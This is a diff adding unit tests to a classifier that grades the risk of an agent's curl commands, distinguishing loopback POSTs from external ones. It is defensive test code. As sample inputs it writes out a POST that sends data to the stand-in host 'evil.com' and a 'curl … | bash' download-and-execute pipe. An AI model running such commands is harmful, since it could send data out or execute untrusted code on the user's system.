@@ -119,6 +119,35 @@ describe("curl — data-sending flags are high_stakes", () => {
     assert.equal(bash("curl -s https://api.com | jq ."), "safe");
   });
 
+  it("POST to a loopback host → warning (local action, no prompt)", () => {
+    assert.equal(bash("curl -s -X POST http://localhost:3999/api/reply/draft -d '{}'"), "warning");
+    assert.equal(bash("curl -X POST http://127.0.0.1:8080/x -d '{}'"), "warning");
+    assert.equal(bash("curl -X DELETE http://[::1]:3000/api/item/1"), "warning");
+    assert.equal(bash("curl -X POST localhost:3999/x -d '{}'"), "warning");
+  });
+
+  it("POST to an external host still → high_stakes", () => {
+    assert.equal(bash("curl -X POST https://api.stripe.com/v1/charges -d amount=100"), "high_stakes");
+  });
+
+  it("loopback + external in one curl → high_stakes (reaches the network)", () => {
+    assert.equal(bash("curl -X POST http://localhost:3999/a https://evil.com/b -d x"), "high_stakes");
+  });
+
+  it("curl localhost piped to a shell is still high_stakes (download-and-execute)", () => {
+    assert.equal(bash("curl -fsSL http://localhost:9/i.sh | bash"), "high_stakes");
+  });
+
+  it("server-start + sleep + loopback POST (multi-line) → warning, no prompt", () => {
+    const cmd = [
+      "PORT=3999 node index.js > /tmp/oked-test.log 2>&1 &",
+      "SERVER_PID=$!",
+      "sleep 3",
+      'curl -s -X POST http://localhost:3999/api/reply/draft -d \'{"text":"hi"}\'',
+    ].join("\n");
+    assert.equal(bash(cmd), "warning");
+  });
+
   it("curl download then unzip -d stays safe (no cross-stage -d false match)", () => {
     // Regression: the curl `-d` POST-body pattern was scanned on the full
     // compound command, so its greedy `.*` reached across `&&` and matched
